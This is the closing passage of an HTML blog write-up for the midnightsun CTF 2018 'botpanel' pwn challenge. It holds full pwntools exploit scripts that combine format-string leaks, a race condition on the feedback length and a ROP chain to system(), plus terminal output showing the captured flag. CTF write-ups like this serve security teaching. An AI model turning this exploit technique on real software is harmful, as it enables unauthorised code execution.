+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"password: "</span><span class="p">,</span> <span class="s">"%15$p"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"was: "</span><span class="p">)</span>
+    <span class="n">CANARY</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"CANARY           : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">CANARY</span><span class="p">))</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Set registered mode"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"password: "</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"%5$n"</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">LOCAL</span><span class="p">:</span>
+        <span class="n">PW</span> <span class="o">=</span> <span class="s">"notrealpw!!"</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">PW</span> <span class="o">=</span> <span class="s">"&gt;@!ADMIN!@&lt;"</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Do real login"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"password: "</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">PW</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"data"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIE</span><span class="p">))</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC</span><span class="p">))</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">STACK</span><span class="p">))</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">CANARY</span><span class="p">))</span>
+
+    <span class="n">MYIP</span> <span class="o">=</span> <span class="s">"XXX.XXX.XXX.XXX"</span>        <span class="c1"># replace with your ip address ;)
+</span>
+    <span class="n">sendinvite</span><span class="p">(</span><span class="n">MYIP</span><span class="p">,</span> <span class="mi">6666</span><span class="p">)</span>
+    <span class="n">sendinvite</span><span class="p">(</span><span class="n">MYIP</span><span class="p">,</span> <span class="mi">7777</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Wait for invite servers to send command..."</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    
+    <span class="k">return</span></code></pre></figure>
+
+<p>This will do the leaking, writing it to a file for simple communication with our server scripts. It will then send two invites back to our own machine on port <code class="language-plaintext highlighter-rouge">6666</code> and <code class="language-plaintext highlighter-rouge">7777</code>, where our secondary server scripts will be waiting.</p>
+
+<p>The first one, will just wait 2 seconds (more than enough for the second script to get into the <code class="language-plaintext highlighter-rouge">edit feedback</code> block), and then overwrite the feedback length:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Wait for incoming connection..."</span><span class="p">)</span>
+
+<span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">6666</span><span class="p">)</span>
+<span class="n">_</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Go into feedback menu..."</span><span class="p">)</span>
+<span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+<span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Waiting for second server to go into feedback..."</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">l</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"length: "</span><span class="p">,</span> <span class="s">"2000"</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Feedback length sent..."</span><span class="p">)</span>
+<span class="n">pause</span><span class="p">()</span></code></pre></figure>
+
+<p>The second server script will read the leaks found by the main exploit and then enter directly into the <code class="language-plaintext highlighter-rouge">edit feedback</code> block by specifying a valid feedback length, and sending a small feedback.</p>
+
+<p>It will then wait 3 seconds, so the first server script will have corrupted the feedback length size, and then edit the feedback, smashing the stack.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so"</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Wait for incoming connection..."</span><span class="p">)</span>
+
+<span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">7777</span><span class="p">)</span>
+
+<span class="n">_</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Read current leaks..."</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"data"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
+
+<span class="n">PIE</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">LIBC</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">STACK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">CANARY</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">PIEBASE</span> <span class="o">=</span> <span class="n">PIE</span> <span class="o">-</span> <span class="mh">0x10c0</span>
+
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LIBC</span> <span class="o">-</span> <span class="mh">0x5d817</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE leak         : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIE</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE base         : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIEBASE</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"STACK leak       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">STACK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"CANARY           : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">CANARY</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC             : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Give feedback with valid size"</span><span class="p">)</span>
+<span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+<span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">l</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"length: "</span><span class="p">,</span> <span class="s">"10"</span><span class="p">)</span>
+<span class="n">l</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Feedback: "</span><span class="p">,</span> <span class="s">"abc"</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Wait for server one to manipulate feedback size..."</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Edit feedback with corrupt feedback size..."</span><span class="p">)</span>
+<span class="n">l</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"y/n?: "</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>
+
+<span class="n">POP</span> <span class="o">=</span> <span class="n">PIEBASE</span> <span class="o">+</span> <span class="mh">0x875</span>
+<span class="n">POP3</span> <span class="o">=</span> <span class="n">PIEBASE</span> <span class="o">+</span> <span class="mh">0x00000f57</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">52</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">CANARY</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"read"</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">POP3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">PIEBASE</span> <span class="o">+</span> <span class="mh">0x5500</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">POP</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">PIEBASE</span> <span class="o">+</span> <span class="mh">0x5500</span><span class="p">)</span>
+
+<span class="n">l</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Feedback: "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Send command..."</span><span class="p">)</span>
+<span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/cat ./flag</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">pause</span><span class="p">()</span></code></pre></figure>
+
+<p>The ropchain will read the command, we want to execute, into <code class="language-plaintext highlighter-rouge">bss</code> and then just call <code class="language-plaintext highlighter-rouge">system(buffer)</code>, which will execute the command and show the result in our main exploit terminal.</p>
+
+<p>We’ll just open three terminals, and start the main exploit (1) and the script for server 1 (2) and server 2 (3)</p>
+
+<p>(1) Starting main exploit:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Opening connection to pwn.midnightsunctf.se on port 31337: Done
+[*] Leak stack / pie / libc
+[*] PIE leak         : 0x565ac0c0
+[*] STACK leak       : 0xffc938e0
+[*] LIBC leak        : 0xf762a817
+[*] CANARY           : 0xa3c49f00
+[*] Set registered mode
+[*] Do real login
+[*] Wait for invite servers to send command...</code></pre></figure>
+
+<p>(2) This will connect to our first server script</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Wait for incoming connection...
+[+] Trying to bind to 0.0.0.0 on port 6666: Done
+[+] Waiting for connections on 0.0.0.0:6666: Got connection from 52.30.206.11 on port 34102
+[*] Go into feedback menu...
+[*] Waiting for second server to go into feedback...</code></pre></figure>
+
+<p>(3) This one is now waiting for the second script to send a valid feedback and get into edit mode</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/home/kileak/pwn/Challenges/midnight/pwn/botpanel/libc.so'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Wait for incoming connection...
+[+] Trying to bind to 0.0.0.0 on port 7777: Done
+[+] Waiting for connections on 0.0.0.0:7777: Got connection from 52.30.206.11 on port 40988
+[*] Read current leaks...
+[*] PIE leak         : 0x565ac0c0
+[*] PIE base         : 0x565ab000
+[*] STACK leak       : 0xffc938e0
+[*] LIBC leak        : 0xf762a817
+[*] CANARY           : 0xa3c49f00
+[*] LIBC             : 0xf75cd000
+[*] Give feedback with valid size
+[*] Wait for server one to manipulate feedback size...</code></pre></figure>
+
+<p>(2) Shortly after, the first server script will kick in again, changing the feedback length</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Feedback length sent...
+[*] Paused (press any to continue)</code></pre></figure>
+
+<p>(3) And finally our second server script can overflow the feedback, send our ropchain and the command we want to execute:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Edit feedback with corrupt feedback size...
+[*] Send command...
+[*] Paused (press any to continue)</code></pre></figure>
+
+<p>(1) which will now execute our command and show it in the main exploit terminal again 8)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Wait for invite servers to send command...
+[*] Switching to interactive mode
+midnight{d0nt_d0_th3_cr1m3_1f_y0u_c4nt_d0_th3_t1m3}
+/home/ctf/redir.sh: line 2:  6224 Segmentation fault      (core dumped) ./chall 60
+[*] Got EOF while reading in interactive</code></pre></figure>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=midnightsun CTF 2018 - botpanel&amp;url=https://kileak.github.io/ctf/2018/midnight-botpanel/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/midnight-botpanel/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/midnight-botpanel';
+        var disqus_title = 'midnightsun CTF 2018 - botpanel';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/midnight-botpanel';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
